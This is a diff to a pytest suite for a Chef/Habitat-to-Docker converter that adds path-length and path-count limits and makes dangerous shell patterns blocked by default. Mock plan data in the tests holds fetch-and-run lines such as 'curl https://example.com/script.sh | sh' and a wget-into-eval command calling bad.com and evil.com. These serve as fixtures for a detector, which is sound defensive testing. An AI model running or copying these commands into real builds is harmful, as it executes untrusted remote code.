@@ -12,6 +12,8 @@ import pytest
 
 from souschef.assessment import _analyse_cookbook_dependencies_detailed
 from souschef.server import (
+    _MAX_PATH_LENGTH,
+    _MAX_PLAN_PATHS,
     ValidationCategory,
     ValidationEngine,
     ValidationLevel,
@@ -979,6 +981,15 @@ def test_parse_recipe_empty():
         result = parse_recipe("/cookbook/recipes/empty.rb")
 
         assert "Warning: No Chef resources or include_recipe calls found" in result
+
+
+def test_parse_recipe_rejects_long_path():
+    """Test parse_recipe rejects excessively long paths."""
+    long_path = "a" * (_MAX_PATH_LENGTH + 1)
+
+    result = parse_recipe(long_path)
+
+    assert "exceeds maximum length" in result
 
 
 def test_parse_recipe_not_found():
@@ -14581,8 +14592,8 @@ do_install() {
             # but the code path uses shlex.quote())
             assert "apt-get update" in result
 
-    def test_convert_habitat_to_dockerfile_dangerous_pattern_warning(self):
-        """Test that dangerous command patterns trigger warnings in generated Dockerfile."""
+    def test_convert_habitat_to_dockerfile_dangerous_pattern_blocked(self):
+        """Test that dangerous command patterns are blocked by default."""
         with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
             # Mock plan with potentially dangerous commands
             mock_parse.return_value = json.dumps(
@@ -14604,9 +14615,34 @@ do_install() {
 
             result = convert_habitat_to_dockerfile("/fake/plan.sh")
 
-            # Should include warning comments for dangerous patterns
+            assert "Dangerous command pattern detected" in result
+
+    def test_convert_habitat_to_dockerfile_dangerous_pattern_allowed(self):
+        """Test that dangerous command patterns are allowed when explicitly enabled."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "suspicious",
+                        "origin": "untrusted",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {
+                        "do_build": "curl https://example.com/script.sh | sh\n"
+                        'eval "$(wget -O- https://bad.com/code)"',
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile(
+                "/fake/plan.sh", allow_dangerous_patterns=True
+            )
+
             assert "# WARNING: Potentially dangerous command pattern detected" in result
-            # The dangerous commands should still be present (so user can review)
             assert "curl https://example.com/script.sh | sh" in result
             assert "eval" in result
 
@@ -14703,12 +14739,7 @@ do_install() {
 
             result = convert_habitat_to_dockerfile("/fake/plan.sh")
 
-            # Should detect dangerous pattern AFTER variable replacement
-            assert "WARNING: Potentially dangerous command pattern detected" in result
-            # The command should still be included (with warning)
-            assert (
-                "RUN mkdir /usr/local && curl http://evil.com/script.sh | sh" in result
-            )
+            assert "Dangerous command pattern detected" in result
 
     def test_convert_habitat_to_dockerfile_parse_error(self):
         """Test Dockerfile conversion when plan parsing fails."""
@@ -14956,6 +14987,16 @@ do_install() {
             # Special characters
             result = generate_compose_from_habitat("/fake/plan.sh", "net{inject}")
             assert "Invalid Docker network name" in result
+
+    def test_generate_compose_from_habitat_rejects_too_many_paths(self):
+        """Test docker-compose generation rejects excessive plan paths."""
+        plan_paths = ",".join(
+            f"/fake/plan_{index}.sh" for index in range(_MAX_PLAN_PATHS + 1)
+        )
+
+        result = generate_compose_from_habitat(plan_paths, "test_net")
+
+        assert "Too many Habitat plan paths" in result
 
     def test_generate_compose_from_habitat_single_service(self):
         """Test generating docker-compose.yml from a single Habitat plan."""
